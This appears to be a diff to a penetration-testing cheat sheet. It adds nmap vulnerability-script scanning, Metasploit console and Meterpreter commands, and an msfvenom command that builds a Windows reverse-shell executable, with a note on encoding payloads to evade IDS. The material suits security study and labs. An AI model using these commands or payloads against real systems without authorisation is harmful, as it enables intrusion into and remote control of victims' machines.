@@ -180,7 +180,10 @@ ttl 64 = Linux, ttl 128 = Windows, ttl 255 = Network device
 #### nmap: Network mapper. Can be used to enumerate a target's ports and much more. By default, it scans the top 1000 most common ports.
 ```
 nmap <target_ip>
-``` 
+```
+```
+nmap -sV --script \vuln -p <port> <target IP>
+```
 ##### -=Flags=-
 -sV = Service Scan,
 -sS = SYN Scan,
@@ -194,6 +197,7 @@ nmap <target_ip>
 -F = Top 100 ports,
 --source-port <port> = Send requests from this port (some firewalls block all traffic except for whitelisted ports, try port 53),
 --script <name/category> = Execute a specific script or scripts from a certain category
+
 
 ### Port Enumeration
 
@@ -300,6 +304,79 @@ sudo apt install redis-tools
 ```
 
 ## Exploitation 💥
+### Metasploit
+Metasploit is a penetration testing framework and computer security project that provides information on exploits and security vulnerabilities. It contains a plethora of different useful tools for enumeration, exploitation, exploit creation, IDS evasion, and more.
+
+#### msfconsole: Metasploit framework console, starts up the metasploit framework console on a terminal.
+```
+msfconsole
+```
+Quiet mode, don't display startup banner...
+```
+msfconsole -q
+```
+
+##### -=Flags=-
+-q = Quiet (does not print banner on startup), -h = Help (displays help menu for command usage and flags)
+
+##### -=Commands=-
+use = Use (select a payload to use, can use payload number or path), show options = Show Options (displays the options that can be set for a specified payload, use once payload is selected), set = Set (set the option specified to a specified value), search = Search (searches for payloads given keywords, can select type to search for like so: search exploit <keyword>, search auxiliary <keyword>), show targets = Show Targets (displays all targets that can be exploited using the selected payload, can set target using set command), run = Run (executes the payload), exploit = Exploit (same as run command)
+```
+msf6> search exploit <exploit name>
+```
+```
+msf6> use <exploit number, exploit path>
+```
+```
+msf6 exploit(some/exploit/path)> show options
+```
+```
+msf6 exploit(some/exploit/path)> set <option name> <option value>
+```
+```
+msf6 exploit(some/exploit/path)> run
+```
+```
+msf6 exploit(some/exploit/path)> exploit
+```
+```
+msf6 exploit(some/exploit/path)> show targets
+```
+
+##### -=Meterpreter=-
+help = Help (displays a help menu for meterpreter, listing things that can be done with it such as evasion, persistence, and more useful things), shell = Shell (drops you into a shell on the target), sessions = Sessions (lists the sessions of meterpreter that are available... You can put a meterpreter session in the background using ctrl + z... To interact with a session you can use: sessions -i <sessionID>)
+```
+meterpreter> help
+```
+```
+meterpreter> shell
+```
+```
+meterpreter> sessions
+```
+```
+meterpreter> sessions -i <sessionID>
+```
+
+
+#### msfvenom: Metasploit framework venom, is a combination of modules msfpayload and msfencode. It allows the creation of payloads, while also aiding in the payloads' encoding to evade IDS detection.
+```
+msfvenom -h
+```
+Lists payloads available:
+```
+msfvenom -l payloads
+```
+Lists encoders availabe:
+```
+msfvenom -l encoders
+```
+Example Windows Reverse Shell:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
+```
+##### -=Flags=-
+-l = List (lists out the specified category/etc), -h = Help (displays a help menu for msfvenom usage and flags), -p = Payload (specifies the payload type)
 
 ## Reverse Engineering 🔄
 
